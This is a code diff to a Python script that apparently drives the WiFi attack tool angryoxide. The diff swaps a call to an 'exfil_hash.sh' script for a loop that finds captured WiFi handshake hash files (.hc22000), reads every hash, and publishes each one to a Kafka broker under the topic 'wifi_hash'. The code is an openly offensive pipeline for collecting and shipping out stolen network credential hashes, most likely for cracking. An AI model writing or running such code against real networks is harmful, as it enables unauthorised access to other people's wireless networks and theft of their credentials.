@@ -211,21 +211,35 @@ def main(interval, broker):
     print(f"[*] Scan interval: {interval} seconds")
     print(f"[*] Kafka broker: {broker}")
 
+    processed_files = set()
+
     # Main loop
     while True:
         try:
-            print(f"[*] Running data scans every {interval} seconds...")
             time.sleep(interval)
-            subprocess.run(["./exfil_hash.sh"])
             
-            # Publish status to Kafka
-            message = {
-                'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
-                'interface': selected_interface,
-                'status': 'running',
-                'pid': angryoxide.pid
-            }
-            publish_to_kafka('avc-status', message, broker=broker)
+            # Find all .hc22000 files in current directory
+            hc_files = [f for f in os.listdir('.') if f.endswith('.hc22000')]
+            
+            for hc_file in hc_files:
+                if hc_file not in processed_files:
+                    print(f"[*] Found new hash file: {hc_file}")
+                    try:
+                        with open(hc_file, 'r') as f:
+                            for line in f:
+                                line = line.strip()
+                                if line:
+                                    message = {
+                                        'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
+                                        'interface': selected_interface,
+                                        'hash_file': hc_file,
+                                        'hash': line
+                                    }
+                                    print(f"[+] Read hash: {line}")
+                                    publish_to_kafka('wifi_hash', message, broker=broker)
+                        processed_files.add(hc_file)
+                    except Exception as e:
+                        print(f"[!] Error reading {hc_file}: {e}")
 
         except KeyboardInterrupt:
             print("\n[!] SIGINT detected (Ctrl-C), shutting down gracefully...")
@@ -237,7 +251,7 @@ def main(interval, broker):
             print(f"[!] Exception occurred: {e}")
 
 # ======================
-# Main Loop
+# Main Loop (calls main)
 # ======================
 
 if __name__ == "__main__":
